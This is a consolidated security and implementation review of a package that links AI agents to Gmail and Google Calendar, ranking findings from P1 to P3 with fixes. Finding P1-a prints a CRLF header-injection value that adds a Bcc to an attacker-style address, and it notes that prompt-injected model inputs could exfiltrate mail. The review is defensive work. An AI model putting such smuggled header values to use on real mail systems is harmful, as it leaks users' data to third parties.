# Connectors — Implementation Review (consolidated)

**Date:** 2026-06-19 · **Scope:** `packages/connectors/*` (engine), `src/lib/connectors/*` +
`src/app/api/connectors/*` (reference host) · **Reviews merged:** trust-spine/toolkit pass +
host/spine pass · **Spec under review:** `docs/connectors-module-spec.md`

**Verification performed:** `@connectors/engine` test suite **72/72 pass**; package typecheck
(`tsc -p packages/connectors/tsconfig.json`) **clean**; root `pnpm ts` passes. (Contrast: the
`@ri/connectors` quarry did not compile — 322 errors.) Lint not used as a signal — its scope
pulls in generated/reference dirs (`.next-smoke`, `.reference`) and is noise here.

---

## 0. Verdict

The architecture is right and the spine is real, not a sketch. The package boundary (core
imports nothing from the app), the Provider/Toolkit/Action split, the single-gate `runAction`
pipeline, OAuth2+PKCE with the single-flight/rotate-or-preserve/persist-before-return refresh,
incremental consent, audit events, and the AI-SDK/MCP projections are all the robust core the
spec set out to build — much closer to a trustworthy engine than an n8n-style node pile.

The findings below are tightening, not rework. **None change the architecture.** But several
must be closed before this touches an agent loop or a paid hosted tenant — the recurring theme
is that the *engine* enforces the trust spine correctly while the *reference host* and a few
*toolkit/scope* details don't yet meet it.

---

## 1. What's solid — do not regress

- **Audit correlation:** `attemptId` pairs every `start`/`finish`; concurrent runs get distinct
  ids (tested).
- **Approval-grant contract:** canonical `inputDigest` (sorted keys, normalized dates) +
  `actionVersion` (invalidates a grant when risk/mutating/schema change) — beyond the spec.
- **Confinement test is sentinel-based**, not pattern-based: a token-echoing provider can't leak
  into an audit preview (tested).
- **Provider-side revoke on disconnect** (best-effort, then local delete) — the trust-spine
  completeness most implementations skip.
- **MCP ingestion is honest:** the approval gate is named as the prompt-injection defense; no
  bogus "we scan for injection" claim.
- **`indeterminate` flag** on post-send mutating failures (network/5xx) — surfaced to the model.
- **Crypto is correct:** AES-256-GCM, random 12-byte IV per seal, tag verified on open, versioned
  envelope; PKCE S256 within the RFC 7636 length range.
- **Registry enforces `ZodObject` action inputs at registration** — the projection's `account`
  injection can't break silently at call time.
- **Toolkit hygiene:** `encodeURIComponent` on every path segment; an `output` mapper on every
  action (no raw passthrough → controls leakage + context bloat); correct risk gradient
  (`delete_event`/`send_email` high, mutations medium, reads low); `base64url` (not plain base64)
  for the Gmail raw message.

---

## 2. Findings — P1 (close before agents / production / hosted)

### P1-a · Gmail send/draft is open to email header injection (security)
**Location:** `packages/connectors/src/providers/google/gmail.ts:14-28` (`encodeEmail`); schemas
`:82-87`, `:101-107` accept bare `z.string()`.
**Problem:** `to`/`cc`/`bcc`/`subject` are interpolated straight into RFC 5322 header lines with
no CR/LF sanitization, and these fields are LLM-controlled (and prompt-injectable). A `subject`
of `"Hi\r\nBcc: exfil@evil.com"` injects a real header; `\r\n\r\n` injects an alternate body.
In an agent send path this is a silent data-exfiltration primitive. (Note the contrast: URL path
params are escaped, mail headers are not.)
**Fix:** reject (or strip) `\r`/`\n` in every header value; validate recipients as email
addresses; RFC 2047-encode non-ASCII subjects (`=?UTF-8?B?…?=`); and fix
`Content-Transfer-Encoding: 7bit` (`:22`) — wrong for a UTF-8 body with non-ASCII bytes. Modeling
recipients as arrays is a reasonable cleanup but does **not** by itself fix injection.
**Test:** add a header-injection test (CRLF in subject/recipient must be rejected) — `create_draft`
and `send_email` currently have no such coverage.

### P1-b · Tenant boundary not wired — `ownerId` never derived at the host
**Location:** default owner `"local"` at `packages/connectors/src/core/runtime.ts:47`; routes never
pass an owner — `src/app/api/connectors/run/route.ts:14`, `connect/route.ts:16`, and most acute,
`connections/route.ts:5` calls `listConnections()` **with no filter**.
**Problem:** correct for local single-user; in hosted/multi-tenant it's a cross-tenant exposure —
`connections/route` returns *every* tenant's connection metadata (emails, labels, scopes) to any
authenticated caller, and `run`/`connect` operate on the shared `local` owner.
**Fix:** derive `ownerId` from the authenticated session/API key at the host boundary and pass it
to every `runAction`/`beginAuth`/`listConnections` call; make owner identity **mandatory** (no
silent `local` fallback) on the hosted adapter. Pairs with spec §20's row-level tenant isolation.

### P1-c · The only real host bypasses the approval gate
**Location:** `src/lib/connectors/runtime.ts:80` hardwires `approval.check()` → `'allow'`
(comment says "TEST SURFACE ONLY"); `src/app/api/connectors/run/route.ts:14` forwards arbitrary
`actionId`/`input` to `runAction`.
**Problem:** the engine's gate is correct and tested, but in the shipping host every mutating
action auto-approves. The route is behind the Bearer-token middleware (not open to the internet),
so the real exposure is "any authenticated session — and soon any agent — runs any mutating action
ungated." Separately, the **grant-remembering policy the digest exists for is unbuilt**: the
default policy returns `'ask'` for every mutating call, so an agent retry loop never converges.
**Fix:** wire a real `ApprovalPolicy` on the host that (1) denies/asks by default for mutating +
agent callers, bridged to the app's existing permission prompts, and (2) **remembers grants keyed
by `actionId + connectionId + actionVersion + inputDigest`** (TTL'd) so approve-once → retry
succeeds. Gate the auto-allow host behind a dev-only flag until then.

### P1-d · Refresh misclassifies transient failures as revocation
**Location:** `packages/connectors/src/auth/oauth2.ts:151-152` —
`definitive = error === 'invalid_grant' || (status >= 400 && status < 500)`.
**Problem:** **every** 4xx (including **429 rate-limited**, 408, transient `invalid_request`) is
treated as definitive revocation → the connection flips to `needs_reauth` and the user must
manually re-authorize. A rate-limited token refresh permanently breaks a *healthy* connection —
an availability bug that needs no attacker and gets worse under hosted load. (Severity note:
behaves like P2 locally, P1 for hosted; listed P1 given the hosted goal.)
**Fix:** `definitive = error === 'invalid_grant'` (plus any provider-declared revocation signal).
Treat 429 (honor `Retry-After`), 408, 5xx, and network errors as transient (`revoked: false`).

---

## 3. Findings — P2

### P2-a · Redaction is optional at the projection boundary, and error messages leak
**Location:** `packages/connectors/src/ai-sdk/index.ts:78`, `src/mcp/serve.ts:66` redact results
only if the caller passes a `redactor`. Separately, `runAction` returns **raw** `e.message` on
errors (`src/core/runtime.ts:549/553/573`) while the *audit* copy is redacted — and
`modelSafeOutcome` (`src/core/projection-shared.ts:46-50`) ships that raw message to the model.
**Problem:** two paths where a secret surfaced by an action (or embedded in a thrown provider/SDK
error) can reach the model — the success result when a projection forgets the redactor, and the
error message always.
**Fix:** redact **inside `runAction`** before returning the outcome (both `result` and any
`message`). Then every projection *and* programmatic caller is covered and it can't be forgotten —
strictly stronger than exposing the redactor for callers to opt into.

### P2-b · Gmail toolkit bundle omits `gmail.compose` → `create_draft` is always blocked
**Location:** bundle `packages/connectors/src/providers/google/gmail.ts:41`
(`[gmailReadonly, gmailSend, gmailModify]`) vs action scope `:81` (`gmailCompose`).
**Problem:** connect the full Gmail toolkit, call `create_draft` → guaranteed `needs_consent` for
a scope the bundle never requests. Untested (the acceptance test only sends mail), which is why it
slipped.
**Fix:** make the toolkit bundle the **union of its actions' scopes** (spec §3 says it defaults to
that), or drop `create_draft` to `gmail.modify` (which authorizes draft creation) per P2-c. Add a
`create_draft` test.

### P2-c · Scope check is flat string-membership; Google scopes are hierarchical
**Location:** `packages/connectors/src/core/runtime.ts:451`
(`required.filter(s => !connection.scopes.includes(s))`).
**Problem:** `gmail.modify` ⊇ `gmail.compose`, `calendar` ⊇ `calendar.events` ⊇
`calendar.events.readonly`. A user holding the broader scope still gets a spurious `needs_consent`
for a narrower one (e.g. holds `gmail.modify`, `create_draft` declares `gmail.compose`). This is
the root cause P2-b is a symptom of: the more precise your action scopes, the more you over-prompt.
**Fix:** optional per-provider `scopeSatisfies(granted: string[], required: string): boolean`
(Google supplies the implication map), consulted by the scope check; or declare action scopes as
"any-of" alternatives.

### P2-d · File-backed host has a cross-process race; `fileLock` is built but unwired
**Location:** `packages/connectors/src/store/file.ts:48` serializes RMW **in-process only** (its
header overclaims cross-process safety); runtime defaults to `inProcessLock()` at
`src/core/runtime.ts:84`; the host passes no lock (`src/lib/connectors/runtime.ts:64`). The
cross-process `fileLock` (`src/lock/file.ts`) exists and is tested but nothing uses it.
**Problem:** the CLI and dev server share one home (by design). Two processes mutating
`connections.json` concurrently lost-update (atomic rename prevents torn files, not lost writes);
two processes refreshing a rotating-token provider double-refresh. Latent today (Google preserves
refresh tokens), real the day a rotating provider lands.
**Fix:** wire `fileLock({ dir: <.config/connectors/locks> })` into the host runtime, and have
`fileStore` take a cross-process `Lock` for its RMW (or downgrade the header comment to match).

### P2-e · `idempotencyKey` is a dead field (false safety affordance)
**Location:** declared `packages/connectors/src/core/types.ts:396`; read **nowhere** (`runAction`
ignores it).
**Problem:** a field named `idempotencyKey` on a mutating-action API implies retry-safety that
doesn't exist.
**Fix:** remove it until it's backed by an attempt/result ledger (the honest interim signal is the
existing `indeterminate` flag); or implement the ledger for high-risk mutations.

---

## 4. Findings — P3 / minor

- **Calendar reads are over-privileged.** `list_events`/`get_event` require `calendar.events` (a
  write scope) — `calendar.ts:53,82`; reads should declare `calendar.readonly` (or add
  `calendar.events.readonly`). Interacts with P2-c. (`list_calendars` already uses readonly.)
- **`gmail.get_message` `format` is a no-op.** The output mapper returns only
  `{id, threadId, snippet, labelIds}` even for `format:'full'` — `gmail.ts:70-73`. Parse the
  payload for `full`/`metadata`, or drop the option.
- **`grantedFrom` over-records scopes** when the token response omits `scope` — falls back to the
  *requested* set (`runtime.ts:633`). Fine for Google (always echoes); note for provider #2.
- **Redactor is a process-lifetime singleton with append-only registration**
  (`redactor.ts:37`, one instance per process). Plaintext secrets accumulate forever — negligible
  locally, unbounded growth + a widening leak-surface on the hosted plane. Scope it per-`runAction`.
- **`account` is a silent reserved input name.** The projection strips/overrides any `account`
  field an action declares (`ai-sdk/index.ts:66,72`). Detect the collision and throw, or namespace
  the injected key (`__account`).
- **Callback puts raw error text in the redirect URL** (`callback/route.ts:32`) → browser
  history/referrer/logs. Map to coarse codes.
- **`fileLock` stale-break (30s)** can let two processes both refresh if one's critical section
  legitimately exceeds it — acceptable for an advisory lock; know the corner.
- **`revokeUrl` is set twice** (provider `:30` and oauth2 config `:34`) — both load-bearing but can
  drift; derive one from the other.

---

## 5. Recommended fix order

A single pass closes everything that gates agents/production, each with a regression test:

1. **P1-a** Gmail header injection — CRLF rejection + recipient validation + subject encoding
   (+ injection test). *Security, highest priority.*
2. **P1-d** Refresh classification — `invalid_grant`-only definitive; 429/4xx/5xx transient.
   *Small, prevents real outages.*
3. **P2-a** Redact in the runtime (result + error message) — closes both leak paths at once.
4. **P1-c** Real grant-remembering `ApprovalPolicy` on the host; auto-allow behind a dev flag.
5. **P1-b** Thread `ownerId` from the authenticated session through all routes; mandatory on hosted.
6. **P2-b + P2-c** Gmail bundle = union of action scopes; per-provider `scopeSatisfies` predicate
   (also fixes the calendar read over-privilege).
7. **P2-d** Wire `fileLock` into the host + store RMW.
8. **P2-e** Delete the dead `idempotencyKey`.

P3s as a follow-up sweep.

---

## 6. Coverage

Deep-read: the full trust spine (`runtime`, `oauth2`, `http`, refresh, `redactor`, `digest`,
crypto), both projections (`ai-sdk`, `mcp/serve`, `mcp/ingest`), the file store + lock, the
registry, the Google provider + Calendar + Gmail toolkits, and the host wiring + route handlers.
Not deep-reviewed: the connect/status test page UI, `pkce`/`ids` helpers (spot-checked),
`in-memory` store, and the live integration paths (a real Google token exchange and a real send
are inherently manual — noted in the implementation's own acceptance section).
